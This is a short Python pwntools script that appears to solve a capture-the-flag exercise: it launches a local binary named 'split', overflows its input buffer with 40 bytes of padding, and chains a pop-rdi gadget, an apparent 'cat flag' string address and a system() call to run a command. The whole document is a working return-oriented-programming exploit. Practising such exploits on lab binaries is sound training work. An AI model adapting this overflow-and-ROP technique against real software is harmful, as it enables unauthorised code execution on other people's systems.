from pwn import *
p = process('./split')

pop_rdi = p64(0x4007c3)
cat_flag = p64(0x601060)
system_call = p64(0x40074B)

payload = b'a' * 40 + pop_rdi + cat_flag + system_call

p.sendlineafter(b'> ',payload)
res = p.recvall(timeout=0.2)
print(res)